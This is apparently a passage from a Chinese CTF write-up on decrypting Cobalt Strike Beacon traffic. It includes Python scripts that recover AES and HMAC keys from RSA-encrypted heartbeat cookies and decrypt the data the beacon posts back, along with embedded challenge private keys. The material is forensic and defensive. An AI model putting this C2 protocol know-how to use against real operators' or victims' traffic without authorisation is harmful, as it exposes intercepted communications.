class="hljs-operator">+</span>gZCbFfhYR9vs5DGLUg9aa0i5Gqh<br>Pz<span class="hljs-symbol">/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC</span><br>gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V<br>r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ<span class="hljs-operator">+</span>rYnCezQcrt4V3c7BZtW9RjFW<br>vHh09PF808Yl4<span class="hljs-symbol">/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL</span><br><span class="hljs-number">3</span>MK<span class="hljs-operator">+</span>EtafnYIDD1IS<span class="hljs-operator">+</span><span class="hljs-number">97</span>K0cbg922RKXNdv<span class="hljs-operator">+</span>kCQQDWJk0kNe8ePBpwJU4slig1Y<span class="hljs-operator">+</span><span class="hljs-number">4</span>VWuwTRz6r<span class="hljs-operator">+</span>MNp<br>v<span class="hljs-operator">+</span>WrVMzo<span class="hljs-symbol">/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG</span><br><span class="hljs-number">9</span>VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB<span class="hljs-operator">+</span>aSxqqO<span class="hljs-symbol">/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C</span><br>dsSmzlA0asqd0azUy7KYqFGNsB<span class="hljs-symbol">/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB</span><br>AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2<br>d<span class="hljs-attr">dsyNI6XbCU</span><span class="hljs-operator">=</span><br><span class="hljs-operator">-</span>----END PRIVATE KEY-----<br></code></pre></td></tr></table></figure>

<p>在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie</p>
<p>运行即可得到 AES和HMAC key</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">AES <span class="hljs-built_in">key</span>:ef08974c0b06bd5127e04ceffe12597b<br>HMAC <span class="hljs-built_in">key</span>:bd87fa356596a38ac3e3bb0b6c3496e9<br></code></pre></td></tr></table></figure>

<p>然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中</p>
<p>把流量包中的POST数据包中的data的值用CyberChef (from hex+to base64) 处理后得到的数据填入上面那个脚本中</p>
<p>一个个解密每个POST数据包中的data即可得到flag</p>
<p>我把上面的步骤整合成了下面一个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> javaobj.v2 <span class="hljs-keyword">as</span> javaobj<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_key</span>(<span class="hljs-params">key_data, key_type</span>):<br>    key_data = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x &amp; <span class="hljs-number">0xFF</span>, key_data))<br>    formatted_key = <span class="hljs-string">f&quot;-----BEGIN <span class="hljs-subst">&#123;key_type&#125;</span> KEY-----\n&quot;</span><br>    formatted_key += base64.encodebytes(key_data).decode()<br>    formatted_key += <span class="hljs-string">f&quot;-----END <span class="hljs-subst">&#123;key_type&#125;</span> KEY-----&quot;</span><br>    <span class="hljs-keyword">return</span> formatted_key<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_key</span>(<span class="hljs-params">keyfile</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(keyfile, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fd:<br>        pobj = javaobj.load(fd)<br><br>    privateKey = format_key(pobj.array.value.privateKey.encoded.data, <span class="hljs-string">&quot;PRIVATE&quot;</span>)<br>    publicKey = format_key(pobj.array.value.publicKey.encoded.data, <span class="hljs-string">&quot;PUBLIC&quot;</span>)<br>    <span class="hljs-keyword">return</span> privateKey,publicKey<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_AES_HMAC_key</span>(<span class="hljs-params">PRIVATE_KEY,encode_data</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    提取协商密钥</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    private_key = RSA.import_key(PRIVATE_KEY.encode())<br>    cipher = PKCS1_v1_5.new(private_key)<br>    ciphertext = cipher.decrypt(base64.b64decode(encode_data), <span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">if</span> ciphertext[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:<br>        raw_aes_keys = ciphertext[<span class="hljs-number">8</span>:<span class="hljs-number">24</span>]<br>        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()<br>        aes_key = raw_aes_hash256[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        hmac_key = raw_aes_hash256[<span class="hljs-number">16</span>:]<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;AES key: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(aes_key.<span class="hljs-built_in">hex</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HMAC key: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(hmac_key.<span class="hljs-built_in">hex</span>()))<br>        hexdump.hexdump(ciphertext)<br>        <br>        <span class="hljs-keyword">return</span> aes_key.<span class="hljs-built_in">hex</span>(),hmac_key.<span class="hljs-built_in">hex</span>()<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_submit_data</span>(<span class="hljs-params">SHARED_KEY,HMAC_KEY,encrypt_data</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    使用协商密钥解密CS的数据</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    SHARED_KEY = binascii.unhexlify(SHARED_KEY)<br>    HMAC_KEY = binascii.unhexlify(HMAC_KEY)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):<br>        <span class="hljs-keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span class="hljs-string">&quot;sha256&quot;</span>).digest()[:<span class="hljs-number">16</span>] != signature:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;message authentication failed&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)<br>        <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_data)<br><br>    encrypt_data = base64.b64decode(encrypt_data)<br>    encrypt_data_length = <span class="hljs-built_in">int</span>.from_bytes(encrypt_data[:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br>    encrypt_data_l = encrypt_data[<span class="hljs-number">4</span>:]<br><br>    data1 = encrypt_data_l[:encrypt_data_length-<span class="hljs-number">16</span>]<br>    signature = encrypt_data_l[encrypt_data_length-<span class="hljs-number">16</span>:encrypt_data_length]<br>    iv_bytes = <span class="hljs-string">b&quot;abcdefghijklmnop&quot;</span><br><br>    dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">80</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;counter: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;任务返回长度: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;任务输出类型: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>    <span class="hljs-built_in">print</span>(dec[<span class="hljs-number">12</span>:<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)])<br>    <span class="hljs-built_in">print</span>(hexdump.hexdump(dec))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    keyfile = <span class="hljs-string">&quot;key&quot;</span> <span class="hljs-comment"># 题目一般会提供，该文件本质上为 KeyPair 的 Java 对象</span><br>    privateKey,publicKey = extract_key(keyfile)<br>    <span class="hljs-comment"># print(privateKey)</span><br>    <span class="hljs-comment"># 协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中</span><br>    cookie_data = <span class="hljs-string">&quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;</span><br>    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)<br>    submit_data = [<span class="hljs-string">&quot;000000e046950d669f91c7c7d9a7580c78f13a9f568122f2a8aba597a52f3832b0afbde054602fe158dbe173ff2532036facafdada898e3c9d798ea5e803269221fef2436fc22428e4d4aac53979ce80dd4809a2d3391dfdb1ea043e9761250175b0ceb38157319e366af76a88464f7d8672e614a051ca4fa846d6e22ee654ce0271381867f13c44ee15a26fc03316596f64bb0786e16af8a8fd900f7d0c7fa895c408e3915fa6a9a5085df6854c34dbf55d968d7f69b00b12083750c30564f94547f6eb6ee62beacda5a73d72ea7d81c79919802aecafed6d991bd0b1b18e04fca5c480&quot;</span>,<span class="hljs-string">&quot;00000040e992086d1e786eeb9b4329bf6eee6f593e44609505d7d0118af590b5e40840782232f30b12ed76f54ef4898d69470498cb4afe43841790fe12af184011858984&quot;</span>,<span class="hljs-string">&quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;</span>,<span class="hljs-string">&quot;000000e0453bf91036fff19e04ce60d065f37f4ed23345246fa7b5ce91d64de96781604717aa720a0f411cf5545d66c750ff0ee7aaa7f4be7e7070ba1ff180f6373d670c7b0e8c73617ec9e3f388a4f99a3d00aca4e85e80db6a8e1a661da37b184b2d779d2d5f6e594ca4c81b3c2fe16856b24d2d6551fed5f79540fcc4ca1ce66168d32f656ea5b7f66d26ae99812a6612da54670acc82524160fc765c1c8cc89cdf110fe4a40a195aa693bd98965abc3244f5c4bd89c104dafcd5e87542dfd90751cf8ea82a769070b01d9af4b037e1ba618de23a378d83104375cc9745893ddc5482&quot;</span>]<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> submit_data:<br>        encrypt_data = base64.b64encode(<span class="hljs-built_in">bytes</span>.fromhex(item))<br>        decrypt_submit_data(SHARED_KEY,HMAC_KEY,encrypt_data)<br>    <br></code></pre></td></tr></table></figure>

<h4 id="给Beacon的情况"><a href="#给Beacon的情况" class="headerlink" title="给Beacon的情况"></a>给Beacon的情况</h4><p>1、使用 <a target="_blank" rel="noopener" href="https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py">1768.py</a> 去解析 Beacon 文件</p>
<p>2、解析公钥，爆破n生成私钥</p>
<p>3、使用私钥去解密心跳包中的cookie信息得到<code>AES_KEY</code>和<code>HMAC_KEY</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><br><br>privateKey = <span class="hljs-string">&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO</span><br><span class="hljs-string">FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx</span><br><span class="hljs-string">XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC</span><br><span class="hljs-string">gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE</span><br><span class="hljs-string">I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf</span><br><span class="hljs-string">pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1</span><br><span class="hljs-string">qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS</span><br><span class="hljs-string">fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3</span><br><span class="hljs-string">PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe</span><br><span class="hljs-string">dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu</span><br><span class="hljs-string">Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg</span><br><span class="hljs-string">p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn</span><br><span class="hljs-string">xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span><br><br>publicKey = <span class="hljs-string">&#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N</span><br><span class="hljs-string">d+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx</span><br><span class="hljs-string">XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAE=</span><br><span class="hljs-string">-----END PUBLIC KEY-----&#x27;&#x27;&#x27;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_AES_HMAC_key</span>(<span class="hljs-params">PRIVATE_KEY,encode_data</span>):<br>    <span class="hljs-comment"># 提取协商密钥和主机信息</span><br>    private_key = RSA.import_key(PRIVATE_KEY.encode())<br>    cipher = PKCS1_v1_5.new(private_key)<br>    ciphertext = cipher.decrypt(base64.b64decode(encode_data), <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> ciphertext[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:<br>        raw_aes_keys = ciphertext[<span class="hljs-number">8</span>:<span class="hljs-number">24</span>]<br>        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()<br>        aes_key = raw_aes_hash256[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        hmac_key = raw_aes_hash256[<span class="hljs-number">16</span>:]<br>        hexdump.hexdump(ciphertext) <span class="hljs-comment"># 主机信息</span><br>        <span class="hljs-keyword">return</span> aes_key.<span class="hljs-built_in">hex</span>(),hmac_key.<span class="hljs-built_in">hex</span>()<br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中</span><br>    cookie_data = <span class="hljs-string">&quot;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&quot;</span><br>    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;AES key: <span class="hljs-subst">&#123;SHARED_KEY&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;HMAC key: <span class="hljs-subst">&#123;HMAC_KEY&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..</span><br><span class="hljs-comment"># 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..</span><br><span class="hljs-comment"># 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w</span><br><span class="hljs-comment"># 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R</span><br><span class="hljs-comment"># 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin</span><br><span class="hljs-comment"># 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac</span><br><span class="hljs-comment"># 00000060: 74 2E 65 78 65                                    t.exe</span><br><span class="hljs-comment"># AES key: 9fe14473479a283821241e2af78017e8</span><br><span class="hljs-comment"># HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d</span><br></code></pre></td></tr></table></figure>

<p>4、解密心跳包 &#x2F;cm 中传输的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):<br>    <span class="hljs-keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span class="hljs-string">&quot;sha256&quot;</span>).digest()[:<span class="hljs-number">16</span>] != signature:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;message authentication failed&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)<br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    SHARED_KEY = binascii.unhexlify(<span class="hljs-string">&quot;9fe14473479a283821241e2af78017e8&quot;</span>)<br>    HMAC_KEY = binascii.unhexlify(<span class="hljs-string">&quot;1e3d54f1b9f0e106773a59b7c379a89d&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    encrypt_data = <span class="hljs-built_in">bytes</span>.fromhex(data)<br>    encrypt_data_length = <span class="hljs-built_in">len</span>(encrypt_data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据总长度为：<span class="hljs-subst">&#123;encrypt_data_length&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)</span><br>    data = encrypt_data[:encrypt_data_length-<span class="hljs-number">16</span>]<br>    signature = encrypt_data[encrypt_data_length-<span class="hljs-number">16</span>:]<br>    iv_bytes = <span class="hljs-string">b&quot;abcdefghijklmnop&quot;</span><br><br>    dec = decrypt(data, iv_bytes, signature, SHARED_KEY, HMAC_KEY)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">80</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] counter: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 任务返回长度: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 任务输出类型: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>    pcapng_data = dec[<span class="hljs-number">64</span>:-<span class="hljs-number">60</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.pcapng&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(pcapng_data)<br>    <span class="hljs-built_in">print</span>(hexdump.hexdump(pcapng_data))<br>    <span class="hljs-comment"># output = dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)].decode(&#x27;gbk&#x27;,errors=&#x27;ignore&#x27;)</span><br>    <span class="hljs-comment"># print(output)</span><br></code></pre></td></tr></table></figure>

<p>5、解密submit.php中回传的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):<br>    <span class="hljs-keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span 